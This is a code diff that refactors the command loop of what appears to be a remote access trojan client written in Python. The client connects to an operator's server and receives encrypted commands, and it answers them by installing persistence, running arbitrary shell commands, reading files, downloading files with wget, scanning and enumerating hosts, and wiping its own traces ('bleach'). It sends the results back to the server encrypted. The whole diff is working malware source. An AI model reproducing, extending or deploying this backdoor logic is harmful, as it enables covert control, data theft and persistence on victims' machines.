@@ -28,63 +28,72 @@ else:
 def client_loop(conn, dhkey):
     while True:
         try:
-            data = crypto.decrypt(conn.recv(4096), dhkey) # receive data from server + decrypt
-        except socket.error:
+            data = conn.recv(4096) # receive data from server
+            if not data:
+                break # handle disconnection
+            try:
+                decrypted = crypto.decrypt(data, dhkey) # decrypt data
+            except Exception as e:
+                print(f'[!] decryption error: {e} [!]')
+                continue # continue loop even if a message couldn't be decrypted
+
+            cmd, _, action = decrypted.partition(' ')
+
+            # process server commands
+            if cmd == 'kill':
+                conn.close()
+                return 1
+
+            elif cmd == 'bleach':
+                conn.close()
+                tools.bleach(plat)
+                return 1
+
+            elif cmd == 'quit':
+                conn.shutdown(socket.SHUT_RDWR)
+                conn.close()
+                break
+
+            elif cmd == 'persistence':
+                results = persistence.run(plat)
+
+            elif cmd == 'scan':
+                results = scan.single_host(action)
+
+            elif cmd == 'enum':
+                results = enum.run(plat)
+
+            elif cmd == 'cat':
+                results = tools.cat(action)
+
+            elif cmd == 'execute':
+                results = tools.execute(action)
+
+            elif cmd == 'ls':
+                results = tools.ls(action)
+
+            elif cmd == 'pwd':
+                results = tools.pwd()
+
+            elif cmd == 'unzip':
+                results = tools.unzip(action)
+
+            elif cmd == 'wget':
+                results = tools.wget(action)
+
+            # results formatting
+            results = results.rstrip() + '\n{} completed!'.format(cmd)
+
+            # send results back to server
+            conn.send(crypto.encrypt(results, dhkey))
+
+        except socket.error as e:
+            print(f'[!] socket error: {e} [!]')
             break # exit loop if socket error
 
-        cmd, _, action = data.partition(' ')
-
-        # process server commands
-        if cmd == 'kill':
-            conn.close()
-            return 1
-
-        elif cmd == 'bleach':
-            conn.close()
-            tools.bleach(plat)
-            return 1
-
-        elif cmd == 'quit':
-            conn.shutdown(socket.SHUT_RDWR)
-            conn.close()
-            break
-
-        elif cmd == 'persistence':
-            results = persistence.run(plat)
-
-        elif cmd == 'scan':
-            results = scan.single_host(action)
-
-        elif cmd == 'enum':
-            results = enum.run(plat)
-
-        elif cmd == 'cat':
-            results = tools.cat(action)
-
-        elif cmd == 'execute':
-            results = tools.execute(action)
-
-        elif cmd == 'ls':
-            results = tools.ls(action)
-
-        elif cmd == 'pwd':
-            results = tools.pwd()
-
-        elif cmd == 'unzip':
-            results = tools.unzip(action)
-
-        elif cmd == 'wget':
-            results = tools.wget(action)
-
-        # results formatting
-        results = results.rstrip() + '\n{} completed!'.format(cmd)
-
-        # send results back to server
-        conn.send(crypto.encrypt(results, dhkey))
+    conn.close()
 
 def main():
-    exit_status = 0
-
     while True:
         conn = socket.socket()
         # try to connect to server
